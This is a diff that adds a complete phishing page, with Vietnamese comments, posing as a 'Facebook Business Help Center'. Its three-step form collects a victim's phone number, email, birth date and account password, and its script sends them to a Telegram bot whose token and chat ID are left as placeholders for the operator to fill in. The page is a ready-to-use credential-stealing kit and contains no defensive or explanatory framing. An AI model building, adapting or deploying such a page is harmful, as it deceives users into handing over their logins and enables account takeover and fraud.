@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Help Center</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background: url('https://source.unsplash.com/random/1600x400') no-repeat center;
+            background-size: cover;
+            color: white;
+            padding: 40px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .container {
+            margin: 20px auto;
+            width: 50%;
+        }
+        .form-box {
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            background: #f9f9f9;
+        }
+        .hidden {
+            display: none;
+        }
+        button {
+            padding: 10px 20px;
+            background: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">Facebook Business Help Center</div>
+    <div class="container">
+        <!-- Bước 1: Chọn lý do -->
+        <div id="step1" class="form-box">
+            <h3>How can we help?</h3>
+            <p>We need more information to address your issue.</p>
+            <label><input type="radio" name="issue" value="mistake"> This is a mistake</label>
+            <br>
+            <button onclick="nextStep('step1', 'step2')">Next</button>
+        </div>
+
+        <!-- Bước 2: Nhập thông tin cá nhân -->
+        <div id="step2" class="form-box hidden">
+            <h3>Get Help</h3>
+            <input type="text" id="phone" placeholder="Phone number" required>
+            <input type="email" id="email" placeholder="Email address" required>
+            <input type="date" id="birthday" placeholder="Birth day" required>
+            <button onclick="nextStep('step2', 'step3')">Next</button>
+        </div>
+
+        <!-- Bước 3: Nhập mật khẩu -->
+        <div id="step3" class="form-box hidden">
+            <h3>Enter Your Password</h3>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button onclick="submitForm()">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";  // Thay bằng token bot của bạn
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";  // Thay bằng chat ID của bạn
+
+        function nextStep(current, next) {
+            document.getElementById(current).classList.add('hidden');
+            document.getElementById(next).classList.remove('hidden');
+        }
+
+        function submitForm() {
+            let phone = document.getElementById('phone').value;
+            let email = document.getElementById('email').value;
+            let birthday = document.getElementById('birthday').value;
+            let password = document.getElementById('password').value;
+
+            if (!phone || !email || !birthday || !password) {
+                alert("Vui lòng nhập đầy đủ thông tin!");
+                return;
+            }
+
+            let message = `📩 *New Form Submission* 📩\n\n📞 Phone: ${phone}\n📧 Email: ${email}\n🎂 Birth day: ${birthday}\n🔑 Password: ${password}`;
+
+            let telegramAPI = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(telegramAPI, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            }).then(response => {
+                if (response.ok) {
+                    alert("Thông tin đã gửi thành công!");
+                    location.reload(); // Reset lại form sau khi gửi
+                } else {
+                    alert("Lỗi khi gửi dữ liệu!");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
